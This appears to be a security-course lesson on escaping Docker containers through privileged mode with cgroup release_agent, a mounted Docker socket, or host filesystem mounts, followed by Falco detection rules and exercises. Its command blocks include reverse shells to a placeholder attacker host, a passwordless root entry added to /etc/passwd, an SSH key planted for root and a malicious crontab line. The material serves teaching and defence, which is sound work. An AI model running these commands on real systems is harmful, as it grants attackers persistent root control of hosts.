---
title: "Container Escape — Privileged Container, Docker Socket, Host Mount"
tags: [container, docker, kubernetes, escape, privileged, cgroup,
       docker-socket, host-mount, T1611, ATT&CK, privilege-escalation]
module: 04-BroadSurface-04
day: 240
related_topics:
  - Container and ECS Attacks (Day 188)
  - Cloud Practice: Container and Kubernetes (Day 206)
  - Post-Exploitation Basics (Day 241)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 240 — Container Escape: Privileged Container, Docker Socket, Host Mount

> "A container is not a security boundary. A container is a resource isolation
> mechanism that happens to have security properties — when configured correctly.
> The moment someone runs `--privileged` or mounts the Docker socket, that
> boundary is gone. The attacker inside the container is one step from the host.
> Know every step of that path."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Identify whether you are inside a container and enumerate its privileges.
2. Escape a privileged container via the cgroup release_agent technique.
3. Escape via a mounted Docker socket.
4. Escape via a host filesystem mount.
5. Write Falco rules that detect each escape technique.

**Time budget:** 4 hours.

**Note:** This lesson builds on the container escape techniques introduced in
Day 206 (Cloud Practice). Today's focus is the technique depth and detection —
Day 206 was about execution speed.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Docker and container fundamentals | Days 9–16 |
| Linux privilege escalation concepts | Days 234–237 |
| Cloud container attacks (ECS, K8s) | Days 188, 206 |

---

## Part 1 — Am I in a Container?

Before attempting escape, confirm your environment. Containers have tell-tale
indicators.

```bash
# Check 1: /.dockerenv exists (Docker places this in every container)
ls /.dockerenv && echo "IN DOCKER CONTAINER"

# Check 2: cgroup shows docker fingerprint
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i kubepods  # Kubernetes pod

# Check 3: init process is not systemd or init
cat /proc/1/cmdline | tr '\0' '\n' | head -1
# Container: shows the entrypoint binary (nginx, python, sh)
# Host: shows /sbin/init or /lib/systemd/systemd

# Check 4: hostname is a short hash
hostname  # e.g. 3f4a9c2e1b7d → likely a container ID

# Check 5: /proc/1/mountinfo shows overlay filesystem
cat /proc/1/mountinfo | grep overlay

# Check 6: environment variables
env | grep -E "DOCKER|KUBERNETES|K8S|CONTAINER"
```

---

## Part 2 — Enumerate Container Privileges

```bash
# What capabilities does this container have?
capsh --print 2>/dev/null
# or:
cat /proc/1/status | grep CapEff
# Decode: capsh --decode=<hex-value>

# Is the container privileged? (all capabilities enabled)
# CapEff: 0000003fffffffff  → privileged (all caps)
# CapEff: 00000000a80425fb  → standard (limited caps)

# Are there writable mounts to the host?
mount | grep -v tmpfs | grep -v overlay | grep -v proc | grep -v sys

# Is the Docker socket mounted?
ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET MOUNTED"

# Is the host filesystem mounted somewhere?
mount | grep /host 2>/dev/null
ls /host 2>/dev/null  # or /mnt, /rootfs, /real-root

# Are there dangerous volumes?
cat /proc/mounts | grep -E "/etc|/root|/var|/proc/sys" | grep -v tmpfs
```

---

## Part 3 — Escape: Privileged Container via cgroup release_agent

**Why it works:** A privileged container has `CAP_SYS_ADMIN` and can mount
cgroup filesystems. The cgroup `release_agent` file contains a path to a
program run by the kernel when a cgroup becomes empty. The kernel runs this as
root on the host — not inside the container.

```bash
# Confirm: container is privileged
cat /proc/1/status | grep CapEff
# Should show all-F (0000003fffffffff or similar large value)

# Setup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enable release_agent notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# Write a payload script on the host (via the container's view of the filesystem)
host_path=$(sed -n 's/.*\soverlay\s.*\slowerdir=\([^,]*\).*/\1/p' /proc/mounts | head -1)
# or more reliably:
host_path=$(cat /proc/mounts | grep -oP "upperdir=\K[^,]+")

echo '#!/bin/bash' > "${host_path}/cmd"
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> "${host_path}/cmd"
chmod +x "${host_path}/cmd"

# Set release_agent to point to our script
echo "${host_path}/cmd" > /tmp/cgrp/release_agent

# Trigger: create and immediately remove a cgroup process
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
echo "" > /tmp/cgrp/x/cgroup.procs

# Wait for the host to execute the release_agent
# nc -lvnp 4444 on attacker → shell as root on the HOST
```

---

## Part 4 — Escape: Docker Socket Mount

**Why it works:** The Docker socket (`/var/run/docker.sock`) provides unauthenticated
access to the Docker daemon. From inside a container with socket access, you can
instruct the Docker daemon (running on the host as root) to create a new privileged
container with the host filesystem mounted.

```bash
# Confirm Docker socket is accessible
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker ... → exists and accessible

# Communicate with Docker daemon via socket (using curl or the docker CLI)
# If docker CLI is available:
docker ps  # lists containers → confirms socket access

# Method A: docker CLI (if available in container)
docker run -it --rm \
  --privileged \
  -v /:/host \
  alpine chroot /host sh

# Method B: curl against the Unix socket (no docker CLI needed)
# Create a privileged container via Docker API:
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /host bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\""],
    "Binds": ["/:/host"],
    "Privileged": true
  }' \
  http://localhost/containers/create | jq -r '.Id'

# Start the container:
CONTAINER_ID="<id-from-above>"
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/${CONTAINER_ID}/start

# The shell callback arrives as root on the host
```

---

## Part 5 — Escape: Host Filesystem Mount

**Why it works:** If the host filesystem (or a sensitive portion like `/etc` or
`/root`) is mounted into the container, you can directly modify host files
to achieve persistence or escalation — no kernel tricks required.

```bash
# Identify host mounts
mount | grep -v tmpfs | grep -v overlay | grep -v proc

# Scenario A: /host is the full host filesystem
ls /host/etc/passwd
# Add a root user:
echo 'ghost::0:0:root:/root:/bin/bash' >> /host/etc/passwd
# On the host: su ghost (no password) → root

# Scenario B: /host/etc is mounted
# Same approach — directly write to /host/etc/passwd

# Scenario C: SSH keys — if /root/.ssh is accessible
mkdir -p /host/root/.ssh
ssh-keygen -t ed25519 -f /tmp/key -N ""
cat /tmp/key.pub >> /host/root/.ssh/authorized_keys
chmod 600 /host/root/.ssh/authorized_keys
# Connect from attacker: ssh -i /tmp/key root@<host-ip>

# Scenario D: cron job on host
echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' \
  >> /host/etc/crontab
# Wait 1 minute → shell as root on host
```

---

## Part 6 — Detection (Falco)

Falco is the standard runtime security tool for container environments.
These rules detect the three escape paths.

```yaml
# /etc/falco/rules.d/container-escape.yaml

# Detect privileged container launch
- rule: Privileged Container Launch
  desc: A privileged container was started
  condition: >
    container.privileged = true and
    evt.type = container
  output: >
    Privileged container started
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: WARNING
  tags: [container, T1611]

# Detect Docker socket access from inside a container
- rule: Docker Socket Access from Container
  desc: A process inside a container accessed the Docker socket
  condition: >
    container and
    evt.type in (open, openat, connect) and
    fd.name = /var/run/docker.sock
  output: >
    Docker socket accessed from container
    (user=%user.name proc=%proc.name container=%container.name)
  priority: CRITICAL
  tags: [container, T1611]

# Detect cgroup release_agent write
- rule: Cgroup Release Agent Write
  desc: Possible container escape via cgroup release_agent
  condition: >
    container and
    open_write and
    fd.name contains release_agent
  output: >
    release_agent file written in container
    (user=%user.name proc=%proc.name container=%container.name)
  priority: CRITICAL
  tags: [container, T1611]

# Detect mount of cgroup filesystem from container
- rule: Cgroup Mount in Container
  desc: Container process mounted a cgroup filesystem
  condition: >
    container and
    evt.type = mount and
    evt.arg.fstype = cgroup
  output: >
    cgroup mounted inside container
    (user=%user.name proc=%proc.name container=%container.name)
  priority: CRITICAL
  tags: [container, T1611]
```

---

## Key Takeaways

1. **`--privileged` destroys the container boundary.** A privileged container
   has every Linux capability. The cgroup release_agent escape is one of many
   paths available. Never run production containers as privileged.
2. **The Docker socket is equivalent to root on the host.** Mounting it into
   a container is equivalent to giving that container root access to the host
   without saying so. Audit all docker run commands and Compose files for
   socket mounts.
3. **Host filesystem mounts are the simplest path.** No kernel tricks, no
   exploits — just file writes. A container with `-v /:/host` is not a container
   in any meaningful security sense.
4. **Falco detects technique, not payload.** Falco rules fire on the behaviour
   (socket access, cgroup mount, release_agent write) regardless of which tool
   the attacker uses. This is robust to attacker variation.
5. **Container escape connects to the host privilege escalation chain.** After
   escaping to the host as root, everything from Days 234–237 applies — SAM dump,
   credential harvesting, lateral movement. The container was just the initial
   access vector.

---

## Exercises

1. Build a Docker compose file with three containers: (a) a privileged container,
   (b) a container with Docker socket mounted, (c) a container with `-v /:/host`.
   Practice all three escapes against this environment.

2. Research: what is seccomp and how does it harden containers against escape
   attempts? What syscalls do the three escape techniques require, and which
   would be blocked by the Docker default seccomp profile?

3. Write a shell script that, when run inside a container, automatically detects
   which escape paths are available (privileged, socket, host mount) and outputs
   a prioritised recommendation.

4. What is rootless Docker? Does it eliminate the container escape vectors
   covered today? Research and document specifically which escape paths are and
   are not mitigated by rootless mode.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q240.1, Q240.2 …).
> Follow-up questions use hierarchical numbering (Q240.1.1, Q240.1.2 …).

---

## Navigation

← Previous: [Day 239 — Windows PrivEsc Lab](DAY-0239-Windows-PrivEsc-Lab.md)
→ Next: [Day 241 — Post-Exploitation Basics](DAY-0241-Post-Exploitation-Basics.md)
